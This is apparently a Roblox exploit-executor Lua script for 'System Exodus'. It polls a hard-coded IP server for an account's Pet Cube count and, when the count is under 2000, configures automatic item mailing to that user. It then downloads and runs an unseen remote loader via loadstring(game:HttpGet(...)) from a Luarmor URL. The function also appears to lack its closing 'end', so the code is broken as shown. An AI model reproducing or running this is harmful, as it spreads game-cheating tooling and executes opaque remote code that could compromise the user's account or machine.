local HttpService = game:GetService("HttpService")
local requests = http_request or request

local function checkMailing()
    local url = "http://141.134.135.241:8080/api/under-2000-cubes" -- Update the URL as needed

    local success, response = pcall(function()
        print("Sending request to:", url)
        return requests({
            Url = url,
            Method = "GET", 
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = ""  -- Assuming no body is needed for GET request
        })
    end)
    
if success then
    print("Request successful.")
    print("Response received:", response.Body)

    -- Decode the JSON from response.Body
    local decodeSuccess, serverData = pcall(function()
        return HttpService:JSONDecode(response.Body) -- Decode response.Body directly
    end)

    if decodeSuccess then
        print("JSON decoded successfully.")
        print("Decoded data:", serverData)

        -- Accessing the first user object in the 'users' array
        local firstUser = serverData.users[1] -- Decode from response.Body
        local username = firstUser.username
        local petCubeAmount = firstUser.petCubeCount or 0 -- Default to 0 if nil
        
        print("Pet Cube Amount for " .. username .. ":", petCubeAmount)
        
        if petCubeAmount < 2000 then
            print("Pet Cube amount is less than 2000, updating settings.")
            getgenv().Settings = {
                Mailing = {
                    ["Pet Cube"] = {Class = "Misc", Amount = "9000"}
                },
                Users = {
                    username,
                },
                ["Split Items Evenly"] = false,
                ["Only Online Accounts"] = false,
                    
                [[ Thank you for using System Exodus <3! ]]
            }
            loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
        else
            print(username .. " has more than 2000 Pet Cubes. No cubes sent.")
        end
    else
        warn("Failed to decode JSON: " .. tostring(response.Body))
    end
else
    warn("Failed to contact server: " .. tostring(response))
end

checkMailing()

